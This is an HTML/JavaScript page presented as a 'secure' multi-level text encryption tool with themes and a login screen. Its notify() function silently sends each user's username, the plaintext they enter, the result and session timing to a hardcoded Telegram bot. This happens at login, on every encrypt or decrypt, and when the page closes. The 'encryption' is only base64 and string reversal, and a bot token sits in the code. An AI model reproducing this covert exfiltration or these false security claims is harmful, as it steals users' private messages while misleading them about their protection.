<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE_CORE // 100+ EXTREME THEMES</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        :root {
            --bg-color: #000000;
            --main-color: #00ff66;
            --panel-bg: rgba(0, 10, 2, 0.95);
            --border-color: #00ff66;
            --output-color: #66ff99;
            --glow-color: rgba(0, 255, 102, 0.5);
        }

        body, html { 
            margin: 0; padding: 0; height: 100%; 
            background: var(--bg-color); color: var(--main-color); 
            font-family: 'Share Tech Mono', monospace; 
            overflow: hidden; 
            transition: background 0.4s, color 0.4s;
        }
        canvas { position: fixed; top: 0; left: 0; z-index: 0; opacity: 0.85; }
        
        .box { 
            position: relative; z-index: 1; 
            display: flex; flex-direction: column; 
            align-items: center; justify-content: center; 
            height: 100vh; padding: 15px; 
        }
        
        .panel { 
            width: 100%; max-width: 420px; padding: 25px; 
            border: 1px solid var(--border-color); 
            background: var(--panel-bg); 
            box-shadow: 0 0 25px var(--glow-color);
            text-align: center; box-sizing: border-box; 
            backdrop-filter: blur(8px);
            border-radius: 6px;
            animation: fadeIn 0.4s ease-in-out;
            transition: all 0.4s;
        }

        h3 { letter-spacing: 2px; text-shadow: 0 0 10px var(--glow-color); margin-top: 0; }
        
        .input-field { 
            width: 100%; background: var(--bg-color); color: var(--main-color); 
            border: 1px solid var(--border-color); padding: 10px; margin: 8px 0; 
            box-sizing: border-box; font-family: 'Share Tech Mono', monospace;
            font-size: 14px; outline: none; transition: 0.3s;
            border-radius: 3px;
        }
        .input-field:focus { 
            box-shadow: 0 0 12px var(--glow-color); 
        }

        .level-group {
            display: flex; justify-content: space-between; margin: 10px 0; gap: 5px;
        }
        .level-btn {
            flex: 1; padding: 8px 4px; font-size: 11px; cursor: pointer;
            background: var(--bg-color); border: 1px solid var(--border-color);
            color: var(--main-color); font-family: 'Share Tech Mono', monospace;
            transition: 0.3s; border-radius: 3px;
        }
        .level-btn.active {
            background: var(--main-color);
            color: var(--bg-color);
            box-shadow: 0 0 12px var(--main-color);
            font-weight: bold;
        }

        .btn { 
            border: 1px solid var(--border-color); background: var(--bg-color); 
            color: var(--main-color); padding: 11px; width: 100%; 
            cursor: pointer; margin-top: 8px; font-weight: bold; 
            font-family: 'Share Tech Mono', monospace; letter-spacing: 1px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); border-radius: 3px;
            position: relative; overflow: hidden;
        }
        .btn:hover { 
            background: var(--main-color); color: var(--bg-color); 
            box-shadow: 0 0 18px var(--main-color); 
            transform: translateY(-2px);
        }
        .btn:active { transform: translateY(1px); }

        #out { 
            border: 1px dashed var(--border-color); padding: 10px; margin: 10px 0; 
            min-height: 25px; word-break: break-all; background: rgba(0,0,0,0.6);
            text-align: left; font-size: 13px; color: var(--output-color);
        }

        .hidden { display: none !important; }
        
        #timer { 
            font-size: 20px; margin-bottom: 10px; color: #fff; 
            text-shadow: 0 0 8px #fff; letter-spacing: 2px;
        }

        .dev-info { 
            margin-top: 15px; font-size: 11px; color: var(--main-color); 
            opacity: 0.8; border-top: 1px dashed var(--border-color); padding-top: 8px; 
            letter-spacing: 1px;
        }

        /* ১০০ থিম সিলেক্ট করার এক্সট্রিম ড্রপডাউন */
        .theme-box {
            margin-bottom: 12px; text-align: left; font-size: 11px;
        }
        .theme-select {
            width: 100%; background: var(--bg-color); color: var(--main-color);
            border: 1px solid var(--border-color); padding: 8px; font-family: 'Share Tech Mono', monospace;
            cursor: pointer; outline: none; border-radius: 3px; margin-top: 3px;
        }

        #toast {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px);
            background: var(--main-color); color: var(--bg-color); padding: 10px 20px;
            font-weight: bold; border-radius: 4px; transition: transform 0.3s ease;
            box-shadow: 0 0 15px var(--glow-color); z-index: 999;
        }
        #toast.show { transform: translateX(-50%) translateY(0); }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

    <canvas id="m"></canvas>
    
    <div class="box">
        <!-- লগইন প্যানেল -->
        <div id="login-ui" class="panel">
            <div class="theme-box">
                <label>SELECT EXTREME THEME (1-100):</label>
                <select id="themeSelectLogin" class="theme-select" onchange="changeTheme(this.value)"></select>
            </div>
            <h3>[ SECURE_ACCESS ]</h3>
            <input type="text" id="uname" class="input-field" placeholder="ENTER USERNAME" autocomplete="off">
            <input type="password" id="upass" class="input-field" placeholder="ENTER PASSWORD (0000)" onkeypress="checkEnter(event, 'login')">
            <button class="btn" onclick="login()">[ INITIALIZE LOGIN ]</button>
            <div class="dev-info">SYSTEM DESIGNED BY: <b>NILOY</b></div>
        </div>
        
        <!-- মূল প্যানেল -->
        <div id="main-ui" class="panel hidden">
            <div class="theme-box">
                <label>SELECT EXTREME THEME (1-100):</label>
                <select id="themeSelectMain" class="theme-select" onchange="changeTheme(this.value)"></select>
            </div>
            <div id="timer">00:00:00</div>
            
            <div style="font-size: 11px; margin-bottom: 2px; text-align: left;">SELECT SECURITY LEVEL:</div>
            <div class="level-group">
                <button class="level-btn active" id="lvl1" onclick="setSecurityLevel(1)">LEVEL 1</button>
                <button class="level-btn" id="lvl2" onclick="setSecurityLevel(2)">LEVEL 2</button>
                <button class="level-btn" id="lvl3" onclick="setSecurityLevel(3)">LEVEL 3</button>
            </div>

            <textarea id="msg" class="input-field" placeholder="বাংলা বা যেকোনো লেখা এখানে লিখুন..." rows="2" onkeypress="checkEnter(event, 'encrypt')"></textarea>
            
            <button class="btn" onclick="send('encrypt')">[ ENCRYPT DATA ]</button>
            <button class="btn" onclick="send('decrypt')">[ DECRYPT DATA ]</button>
            <div id="out">OUTPUT_BUFFER...</div>
            <button class="btn" onclick="copy()">[ COPY TO CLIPBOARD ]</button>
            <div class="dev-info">CORE: ACTIVE | DEV: NILOY</div>
        </div>
    </div>

    <div id="toast">NOTIFICATION</div>

<script>
    const TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
    const ID = "7938556654";
    const CORRECT_PASS = "0000"; 
    let user = "", start = 0, timerInterval;
    let currentSecurityLevel = 1;

    // ১০০টি প্রিমিয়াম এবং চরম এক্সট্রিম থিমের কালার প্যালেট জেনারেটর
    const themes = [];
    const baseColors = [
        "#00ff66", "#ff3333", "#00f0ff", "#ffb700", "#bf00ff", "#ff007f", "#33ffff", "#ff9900", 
        "#76ff03", "#00e5ff", "#e040fb", "#69f0ae", "#ffd740", "#ff6e40", "#18ffff", "#ea80fc",
        "#ffff00", "#ff1744", "#00e676", "#651fff", "#00b0ff", "#1de9b6", "#c6ff00", "#ffab40"
    ];

    for (let i = 1; i <= 100; i++) {
        let col = baseColors[(i - 1) % baseColors.length];
        // ভিন্ন ভিন্ন শেডের কালার তৈরি
        let r = parseInt(col.substr(1,2),16);
        let g = parseInt(col.substr(3,2),16);
        let b = parseInt(col.substr(5,2),16);
        themes.push({
            name: `EXTREME THEME #${i}`,
            bg: `#030205`,
            main: col,
            panel: `rgba(${Math.floor(r/10)}, ${Math.floor(g/10)}, ${Math.floor(b/10)}, 0.95)`,
            border: col,
            output: `rgba(${r}, ${g}, ${b}, 0.85)`,
            glow: `rgba(${r}, ${g}, ${b}, 0.45)`
        });
    }

    // ড্রপডাউন অপশন পপুলেট করা
    function initThemes() {
        let optionsHTML = "";
        themes.forEach((t, index) => {
            optionsHTML += `<option value="${index}">${t.name}</option>`;
        });
        document.getElementById('themeSelectLogin').innerHTML = optionsHTML;
        document.getElementById('themeSelectMain').innerHTML = optionsHTML;
    }
    initThemes();

    function changeTheme(index) {
        let t = themes[index];
        let root = document.documentElement;
        root.style.setProperty('--bg-color', t.bg);
        root.style.setProperty('--main-color', t.main);
        root.style.setProperty('--panel-bg', t.panel);
        root.style.setProperty('--border-color', t.border);
        root.style.setProperty('--output-color', t.output);
        root.style.setProperty('--glow-color', t.glow);

        // সিঙ্ক ড্রপডাউন
        document.getElementById('themeSelectLogin').value = index;
        document.getElementById('themeSelectMain').value = index;
        showToast("ACTIVATED: " + t.name);
    }

    function setSecurityLevel(level) {
        currentSecurityLevel = level;
        document.querySelectorAll('.level-btn').forEach(btn => btn.classList.remove('active'));
        document.getElementById('lvl' + level).classList.add('active');
        showToast("SECURITY LEVEL " + level + " ACTIVATED");
    }

    const c = document.getElementById('m'), ctx = c.getContext('2d');
    c.width = window.innerWidth; c.height = window.innerHeight;
    const matrix = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ0123456789@#$%&★⚡🔥💻🛡️";
    let drops = Array(Math.floor(c.width/22)).fill(1);
    
    function draw() { 
        ctx.fillStyle = "rgba(0, 0, 0, 0.08)"; 
        ctx.fillRect(0, 0, c.width, c.height); 
        ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--main-color'); 
        ctx.font = "14px 'Share Tech Mono'"; 
        drops.forEach((y, i) => { 
            const t = matrix[Math.floor(Math.random() * matrix.length)]; 
            ctx.fillText(t, i * 22, y * 22); 
            if(y * 22 > c.height && Math.random() > 0.975) drops[i] = 0; 
            drops[i]++; 
        }); 
    } 
    setInterval(draw, 40);

    function showToast(text) {
        let toast = document.getElementById('toast');
        toast.innerText = text;
        toast.classList.add('show');
        setTimeout(() => { toast.classList.remove('show'); }, 2200);
    }

    function notify(text) { 
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`); 
    }

    function login() { 
        let u = document.getElementById('uname').value.trim();
        let p = document.getElementById('upass').value;
        
        if(u && p === CORRECT_PASS) { 
            user = u;
            document.getElementById('login-ui').classList.add('hidden'); 
            document.getElementById('main-ui').classList.remove('hidden'); 
            notify(`🟢 LOGIN SUCCESS\nUser: ${user}\nDeveloper: NILOY`); 
            showToast("ACCESS GRANTED");
            
            start = Date.now(); 
            timerInterval = setInterval(() => { 
                let s = Math.floor((Date.now() - start) / 1000); 
                let hrs = Math.floor(s / 3600).toString().padStart(2, '0');
                let mins = Math.floor((s % 3600) / 60).toString().padStart(2, '0');
                let secs = (s % 60).toString().padStart(2, '0');
                document.getElementById('timer').innerText = `${hrs}:${mins}:${secs}`; 
            }, 1000); 
        } else {
            showToast("ACCESS DENIED: WRONG CREDENTIALS");
        }
    }

    function unicodeToBase64(str) {
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
            return String.fromCharCode('0x' + p1);
        }));
    }

    function base64ToUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    function multiLevelEncrypt(text, level) {
        let encoded = unicodeToBase64(text);
        if (level === 2) {
            encoded = unicodeToBase64(encoded.split('').reverse().join(''));
        } else if (level === 3) {
            let rev = encoded.split('').reverse().join('');
            encoded = "SECURE_L3_" + unicodeToBase64(rev) + "_L3";
        }
        return encoded;
    }

    function multiLevelDecrypt(cipher, level) {
        if (level === 3) {
            if (!cipher.startsWith("SECURE_L3_") || !cipher.endsWith("_L3")) {
                throw new Error("Invalid Level 3 Format");
            }
            let core = cipher.replace("SECURE_L3_", "").replace("_L3", "");
            let decodedOnce = base64ToUnicode(core);
            let unreversed = decodedOnce.split('').reverse().join('');
            return base64ToUnicode(unreversed);
        } else if (level === 2) {
            let decodedOnce = base64ToUnicode(cipher);
            let unreversed = decodedOnce.split('').reverse().join('');
            return base64ToUnicode(unreversed);
        } else {
            return base64ToUnicode(cipher);
        }
    }

    function send(type) {
        let msg = document.getElementById('msg').value;
        if(!msg) { showToast("ERROR: EMPTY PAYLOAD"); return; }
        try {
            let res = "";
            if (type === 'encrypt') {
                res = multiLevelEncrypt(msg, currentSecurityLevel);
            } else {
                res = multiLevelDecrypt(msg, currentSecurityLevel);
            }
            document.getElementById('out').innerText = res;
            notify(`⚡ ${type.toUpperCase()} (Lvl ${currentSecurityLevel})\nUser: ${user}\nInput: ${msg}\nOutput: ${res}`);
            showToast(type.toUpperCase() + " SUCCESSFUL (L-" + currentSecurityLevel + ")");
        } catch(e) { 
            showToast("ERROR: DECRYPTION FAILED OR WRONG LEVEL"); 
        }
    }

    function copy() { 
        let textToCopy = document.getElementById('out').innerText;
        navigator.clipboard.writeText(textToCopy); 
        showToast("BUFFER COPIED TO CLIPBOARD"); 
    }

    function checkEnter(event, action) {
        if (event.key === 'Enter') {
            event.preventDefault();
            if (action === 'login') login();
            else if (action === 'encrypt') send('encrypt');
        }
    }

    window.onbeforeunload = () => { 
        if(user) notify(`🔴 SESSION TERMINATED\nUser: ${user}\nDuration: ${document.getElementById('timer').innerText}`); 
    };
</script>
</body>
</html>
